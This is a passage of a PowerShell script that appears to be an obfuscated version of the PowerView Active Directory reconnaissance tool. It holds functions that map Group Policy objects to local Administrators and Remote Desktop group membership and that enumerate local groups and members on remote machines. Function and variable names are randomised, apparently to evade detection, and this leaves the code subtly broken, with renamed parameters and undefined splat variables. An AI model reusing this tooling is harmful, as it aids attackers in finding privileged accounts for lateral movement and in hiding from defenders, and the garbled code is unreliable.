                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function bustling {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $MhNmgElNMTxhWpJ,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $n9gorCgPlTjDyXn = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $svcmntMsFQJZzhj = @{}
        if ($PSBoundParameters['Domain']) { $svcmntMsFQJZzhj['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $svcmntMsFQJZzhj['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $svcmntMsFQJZzhj['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $svcmntMsFQJZzhj['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $svcmntMsFQJZzhj['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $svcmntMsFQJZzhj['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $svcmntMsFQJZzhj['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        $qriOmITdinqDXTk = @()

        if ($PSBoundParameters['Identity']) {
            $qriOmITdinqDXTk += ensnared @CommonArguments -MhNmgElNMTxhWpJ $MhNmgElNMTxhWpJ | Select-Object -Expand objectsid
            $cCTdtWnPw9wKmZm = $qriOmITdinqDXTk
            if (-not $qriOmITdinqDXTk) {
                Throw "[bustling] Unable to retrieve SID for identity '$MhNmgElNMTxhWpJ'"
            }
        }
        else {

            $qriOmITdinqDXTk = @('*')
        }

        if ($n9gorCgPlTjDyXn -match 'S-1-5') {
            $DJOqOmUdDBCsqIX = $n9gorCgPlTjDyXn
        }
        elseif ($n9gorCgPlTjDyXn -match 'Admin') {
            $DJOqOmUdDBCsqIX = 'S-1-5-32-544'
        }
        else {

            $DJOqOmUdDBCsqIX = 'S-1-5-32-555'
        }

        if ($qriOmITdinqDXTk[0] -ne '*') {
            ForEach ($GcgzidmbGlwR9ya in $qriOmITdinqDXTk) {
                Write-Verbose "[bustling] Enumerating nested group memberships for: '$GcgzidmbGlwR9ya'"
                $qriOmITdinqDXTk += offenses @CommonArguments -wDpWXLYTGZrAWN9 'objectsid' -DLxbUKVxTLgnbyW $GcgzidmbGlwR9ya | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[bustling] Target localgroup SID: $DJOqOmUdDBCsqIX"
        Write-Verbose "[bustling] Effective target domain SIDs: $qriOmITdinqDXTk"

        $NOP9JoVDHky9tOL = bang @CommonArguments -dqvnJU9M99MozLE | ForEach-Object {
            $DZpFNwY9CVwYuLd = $_

            if ($DZpFNwY9CVwYuLd.GroupSID -match $DJOqOmUdDBCsqIX) {
                $DZpFNwY9CVwYuLd.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($qriOmITdinqDXTk[0] -eq '*') -or ($qriOmITdinqDXTk -Contains $_) ) {
                        $DZpFNwY9CVwYuLd
                    }
                }
            }

            if ( ($DZpFNwY9CVwYuLd.GroupMemberOf -contains $DJOqOmUdDBCsqIX) ) {
                if ( ($qriOmITdinqDXTk[0] -eq '*') -or ($qriOmITdinqDXTk -Contains $DZpFNwY9CVwYuLd.GroupSID) ) {
                    $DZpFNwY9CVwYuLd
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $NOP9JoVDHky9tOL | Where-Object {$_} | ForEach-Object {
            $u9d9WHZXI9wtSod = $_.GPODisplayName
            $SrDvQoFRSWcYQUM = $_.GPOName
            $FNDXVkjOEPWLvbC = $_.GPOPath
            $nssUSBpcubwAjRQ = $_.GPOType
            if ($_.GroupMembers) {
                $PQOp9Qlwt9GYiBm = $_.GroupMembers
            }
            else {
                $PQOp9Qlwt9GYiBm = $_.GroupSID
            }

            $XzKnmEz9UFLjssS = $_.Filters

            if ($qriOmITdinqDXTk[0] -eq '*') {

                $wFAFetlTyx9Ka99 = $PQOp9Qlwt9GYiBm
            }
            else {
                $wFAFetlTyx9Ka99 = $cCTdtWnPw9wKmZm
            }


            Noelle @CommonArguments -Raw -wDpWXLYTGZrAWN9 'name,distinguishedname' -tT9bcwDtpzBQOMQ $SrDvQoFRSWcYQUM | ForEach-Object {
                if ($XzKnmEz9UFLjssS) {
                    $9gyUBMStBaX9aH9 = eigenvalues @CommonArguments -wDpWXLYTGZrAWN9 'dnshostname,distinguishedname' -KZiNDyuCPTYnSy9 $_.Path | Where-Object {$_.distinguishedname -match ($XzKnmEz9UFLjssS.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $9gyUBMStBaX9aH9 = eigenvalues @CommonArguments -wDpWXLYTGZrAWN9 'dnshostname' -KZiNDyuCPTYnSy9 $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($9gyUBMStBaX9aH9) {
                    if ($9gyUBMStBaX9aH9 -isnot [System.Array]) {$9gyUBMStBaX9aH9 = @($9gyUBMStBaX9aH9)}

                    ForEach ($GcgzidmbGlwR9ya in $wFAFetlTyx9Ka99) {
                        $Object = ensnared @CommonArguments -MhNmgElNMTxhWpJ $GcgzidmbGlwR9ya -wDpWXLYTGZrAWN9 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $N9OnjqLhExywIoM = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $nkMDZvwMcDpEmyi = New-Object PSObject
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'Domain' $pkMxgDCVHqOym9m
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'IsGroup' $N9OnjqLhExywIoM
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPODisplayName' $u9d9WHZXI9wtSod
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPOGuid' $SrDvQoFRSWcYQUM
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPOPath' $FNDXVkjOEPWLvbC
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPOType' $nssUSBpcubwAjRQ
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ComputerName' $9gyUBMStBaX9aH9
                        $nkMDZvwMcDpEmyi.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $nkMDZvwMcDpEmyi
                    }
                }
            }


            fourteenths @CommonArguments -wDpWXLYTGZrAWN9 'siteobjectbl,distinguishedname' -tT9bcwDtpzBQOMQ $SrDvQoFRSWcYQUM | ForEach-Object {
                ForEach ($GcgzidmbGlwR9ya in $wFAFetlTyx9Ka99) {
                    $Object = ensnared @CommonArguments -MhNmgElNMTxhWpJ $GcgzidmbGlwR9ya -wDpWXLYTGZrAWN9 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $N9OnjqLhExywIoM = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $nkMDZvwMcDpEmyi = New-Object PSObject
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'IsGroup' $N9OnjqLhExywIoM
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'Domain' $pkMxgDCVHqOym9m
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPODisplayName' $u9d9WHZXI9wtSod
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPOGuid' $SrDvQoFRSWcYQUM
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPOPath' $FNDXVkjOEPWLvbC
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'GPOType' $nssUSBpcubwAjRQ
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $nkMDZvwMcDpEmyi | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $nkMDZvwMcDpEmyi.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $nkMDZvwMcDpEmyi
                }
            }
        }
    }
}


function miniaturizes {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $HQaTtXpaNwfS9rI,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $XuPSdXugzAaqDfx,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $n9gorCgPlTjDyXn = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $svcmntMsFQJZzhj = @{}
        if ($PSBoundParameters['Domain']) { $svcmntMsFQJZzhj['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $svcmntMsFQJZzhj['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $svcmntMsFQJZzhj['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $svcmntMsFQJZzhj['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $svcmntMsFQJZzhj['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $svcmntMsFQJZzhj['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $svcmntMsFQJZzhj['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $YgV9AHIyzTkweBW = eigenvalues @CommonArguments -MhNmgElNMTxhWpJ $HQaTtXpaNwfS9rI -wDpWXLYTGZrAWN9 'distinguishedname,dnshostname'

            if (-not $YgV9AHIyzTkweBW) {
                throw "[miniaturizes] Computer $HQaTtXpaNwfS9rI not found. Try a fully qualified host name."
            }

            ForEach ($wlkrajnezbzvml9 in $YgV9AHIyzTkweBW) {

                $CWmxUdQl9JrgRlt = @()


                $DN = $wlkrajnezbzvml9.distinguishedname
                $OUCAfsvAjShBzc9 = $DN.IndexOf('OU=')
                if ($OUCAfsvAjShBzc9 -gt 0) {
                    $mrNlWXlqYUQkBOD = $DN.SubString($OUCAfsvAjShBzc9)
                }
                if ($mrNlWXlqYUQkBOD) {
                    $CWmxUdQl9JrgRlt += Noelle @CommonArguments -KZiNDyuCPTYnSy9 $mrNlWXlqYUQkBOD -RmrzVOkRggEzAyC '(gplink=*)' | ForEach-Object {
                        Select-String -BKOFrZwF9JQDCEa $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }


                Write-Verbose "Enumerating the sitename for: $($wlkrajnezbzvml9.dnshostname)"
                $TI9qcSwGfGkjbX9 = (fillers -cNTDaoDBIWkDu9I $wlkrajnezbzvml9.dnshostname).SiteName
                if ($TI9qcSwGfGkjbX9 -and ($TI9qcSwGfGkjbX9 -notmatch 'Error')) {
                    $CWmxUdQl9JrgRlt += fourteenths @CommonArguments -MhNmgElNMTxhWpJ $TI9qcSwGfGkjbX9 -RmrzVOkRggEzAyC '(gplink=*)' | ForEach-Object {
                        Select-String -BKOFrZwF9JQDCEa $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }


                $CWmxUdQl9JrgRlt | bang @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $DZpFNwY9CVwYuLd = $_

                    if($DZpFNwY9CVwYuLd.GroupMembers) {
                        $PQOp9Qlwt9GYiBm = $DZpFNwY9CVwYuLd.GroupMembers
                    }
                    else {
                        $PQOp9Qlwt9GYiBm = $DZpFNwY9CVwYuLd.GroupSID
                    }

                    $PQOp9Qlwt9GYiBm | ForEach-Object {
                        $Object = ensnared @CommonArguments -MhNmgElNMTxhWpJ $_
                        $N9OnjqLhExywIoM = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $EkssUFhqevNhbXG = New-Object PSObject
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9.dnshostname
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'ObjectSID' $_
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'IsGroup' $N9OnjqLhExywIoM
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'GPODisplayName' $DZpFNwY9CVwYuLd.GPODisplayName
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'GPOGuid' $DZpFNwY9CVwYuLd.GPOName
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'GPOPath' $DZpFNwY9CVwYuLd.GPOPath
                        $EkssUFhqevNhbXG | Add-Member Noteproperty 'GPOType' $DZpFNwY9CVwYuLd.GPOType
                        $EkssUFhqevNhbXG.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $EkssUFhqevNhbXG
                    }
                }
            }
        }
    }
}


function ablaze {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Tj9sqOWMRhlsjX9 = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

        $An9cEA9BZazncEs = @{}
        if ($PSBoundParameters['Server']) { $An9cEA9BZazncEs['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Credential']) { $An9cEA9BZazncEs['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m
            $An9cEA9BZazncEs['Domain'] = $pkMxgDCVHqOym9m
        }

        if ($Tj9sqOWMRhlsjX9 -eq 'All') {
            $tHAcROQOWB9HdRG['Identity'] = '*'
        }
        elseif ($Tj9sqOWMRhlsjX9 -eq 'Domain') {
            $tHAcROQOWB9HdRG['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Tj9sqOWMRhlsjX9 -eq 'DomainController') -or ($Tj9sqOWMRhlsjX9 -eq 'DC')) {
            $tHAcROQOWB9HdRG['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $tHAcROQOWB9HdRG['Identity'] = $Tj9sqOWMRhlsjX9
        }

        $GWbqZnkHcsDIMzI = shuffling @SearcherArguments

        ForEach ($GPO in $GWbqZnkHcsDIMzI) {

            $Y9cRKuiJMtuypTR = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $BSYjipWlXb9kvq9 =  @{
                'GptTmplPath' = $Y9cRKuiJMtuypTR
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $BSYjipWlXb9kvq9['Credential'] = $szvFVWkPJummdcf }


            intriguing @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}










function ellipses {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $hcDrBLy9ZyM9IkS = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {
            if ($hcDrBLy9ZyM9IkS -eq 'API') {



                $eWWQvrgoyViISYz = 1
                $aNiBQenLexxQfRW = [IntPtr]::Zero
                $Uc9GjSDPNk9d9jP = 0
                $PSFMflZkgNAkW9Q = 0
                $9kUlAuTTPvri9LF = 0


                $tP9ZFuQ9oFJi9ZB = $fWPrzxt9Txhddkn::NetLocalGroupEnum($wlkrajnezbzvml9, $eWWQvrgoyViISYz, [ref]$aNiBQenLexxQfRW, -1, [ref]$Uc9GjSDPNk9d9jP, [ref]$PSFMflZkgNAkW9Q, [ref]$9kUlAuTTPvri9LF)


                $IQJFgwWwdtqcTml = $aNiBQenLexxQfRW.ToInt64()


                if (($tP9ZFuQ9oFJi9ZB -eq 0) -and ($IQJFgwWwdtqcTml -gt 0)) {


                    $MpkVCERvuMvVtNa = $UIWJeBULXAEkdPs::GetSize()


                    for ($i = 0; ($i -lt $Uc9GjSDPNk9d9jP); $i++) {

                        $hsSd9EOnfwKvO9d = New-Object System.Intptr -ArgumentList $IQJFgwWwdtqcTml
                        $Info = $hsSd9EOnfwKvO9d -as $UIWJeBULXAEkdPs

                        $IQJFgwWwdtqcTml = $hsSd9EOnfwKvO9d.ToInt64()
                        $IQJFgwWwdtqcTml += $MpkVCERvuMvVtNa

                        $n9gorCgPlTjDyXn = New-Object PSObject
                        $n9gorCgPlTjDyXn | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                        $n9gorCgPlTjDyXn | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $n9gorCgPlTjDyXn | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $n9gorCgPlTjDyXn.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $n9gorCgPlTjDyXn
                    }

                    $Null = $fWPrzxt9Txhddkn::NetApiBufferFree($aNiBQenLexxQfRW)
                }
                else {
                    Write-Verbose "[ellipses] Error: $(([ComponentModel.Win32Exception] $tP9ZFuQ9oFJi9ZB).Message)"
                }
            }
            else {

                $YYPfLvSsTJkwCcx = [ADSI]"WinNT://$wlkrajnezbzvml9,computer"

                $YYPfLvSsTJkwCcx.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $n9gorCgPlTjDyXn = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                    $Group | Add-Member Noteproperty 'GroupName' ($n9gorCgPlTjDyXn.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($n9gorCgPlTjDyXn.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($n9gorCgPlTjDyXn.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function kicking {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $T9tockrmJu9UTGT = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $hcDrBLy9ZyM9IkS = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {
            if ($hcDrBLy9ZyM9IkS -eq 'API') {



                $eWWQvrgoyViISYz = 2
                $aNiBQenLexxQfRW = [IntPtr]::Zero
                $Uc9GjSDPNk9d9jP = 0
                $PSFMflZkgNAkW9Q = 0
                $9kUlAuTTPvri9LF = 0


                $tP9ZFuQ9oFJi9ZB = $fWPrzxt9Txhddkn::NetLocalGroupGetMembers($wlkrajnezbzvml9, $T9tockrmJu9UTGT, $eWWQvrgoyViISYz, [ref]$aNiBQenLexxQfRW, -1, [ref]$Uc9GjSDPNk9d9jP, [ref]$PSFMflZkgNAkW9Q, [ref]$9kUlAuTTPvri9LF)


                $IQJFgwWwdtqcTml = $aNiBQenLexxQfRW.ToInt64()

                $sDYnzWrKftKJNli = @()


                if (($tP9ZFuQ9oFJi9ZB -eq 0) -and ($IQJFgwWwdtqcTml -gt 0)) {


                    $MpkVCERvuMvVtNa = $xuZBZnbfFMUecjN::GetSize()


                    for ($i = 0; ($i -lt $Uc9GjSDPNk9d9jP); $i++) {

                        $hsSd9EOnfwKvO9d = New-Object System.Intptr -ArgumentList $IQJFgwWwdtqcTml
                        $Info = $hsSd9EOnfwKvO9d -as $xuZBZnbfFMUecjN

                        $IQJFgwWwdtqcTml = $hsSd9EOnfwKvO9d.ToInt64()
                        $IQJFgwWwdtqcTml += $MpkVCERvuMvVtNa

                        $DDSLoqG9xTVtEQU = ''
                        $ZapCWQ9vaixQrHr = $JRe9dkTvhkNHAuS::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$DDSLoqG9xTVtEQU);$aMxKZmpCKWbTpbk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($ZapCWQ9vaixQrHr -eq 0) {
                            Write-Verbose "[kicking] Error: $(([ComponentModel.Win32Exception] $aMxKZmpCKWbTpbk).Message)"
                        }
                        else {
                            $9mLdlSJRwrOuSuV = New-Object PSObject
                            $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                            $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'GroupName' $T9tockrmJu9UTGT
                            $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'SID' $DDSLoqG9xTVtEQU
                            $N9OnjqLhExywIoM = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'IsGroup' $N9OnjqLhExywIoM
                            $9mLdlSJRwrOuSuV.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $sDYnzWrKftKJNli += $9mLdlSJRwrOuSuV
                        }
                    }


                    $Null = $fWPrzxt9Txhddkn::NetApiBufferFree($aNiBQenLexxQfRW)


                    $KeMImlMyvEl9olX = $sDYnzWrKftKJNli | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($KeMImlMyvEl9olX) {
                        $KeMImlMyvEl9olX = $KeMImlMyvEl9olX.Substring(0, $KeMImlMyvEl9olX.LastIndexOf('-'))

                        $sDYnzWrKftKJNli | ForEach-Object {
                            if ($_.SID -match $KeMImlMyvEl9olX) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $sDYnzWrKftKJNli | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $sDYnzWrKftKJNli
                }
                else {
                    Write-Verbose "[kicking] Error: $(([ComponentModel.Win32Exception] $tP9ZFuQ9oFJi9ZB).Message)"
                }
            }
            else {

                try {
                    $ArVMTJxzXRTeqf9 = [ADSI]"WinNT://$wlkrajnezbzvml9/$T9tockrmJu9UTGT,group"

                    $ArVMTJxzXRTeqf9.psbase.Invoke('Members') | ForEach-Object {

                        $9mLdlSJRwrOuSuV = New-Object PSObject
                        $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                        $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'GroupName' $T9tockrmJu9UTGT

                        $bQMIjDgp9sDD9pr = ([ADSI]$_)
                        $x9OCfcrCZLWxyKn = $bQMIjDgp9sDD9pr.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $N9OnjqLhExywIoM = ($bQMIjDgp9sDD9pr.SchemaClassName -like 'group')

                        if(([regex]::Matches($x9OCfcrCZLWxyKn, '/')).count -eq 1) {

                            $SpXFzWaRNXbUPWc = $True
                            $Name = $x9OCfcrCZLWxyKn.Replace('/', '\')
                        }
                        else {

                            $SpXFzWaRNXbUPWc = $False
                            $Name = $x9OCfcrCZLWxyKn.Substring($x9OCfcrCZLWxyKn.IndexOf('/')+1).Replace('/', '\')
                        }

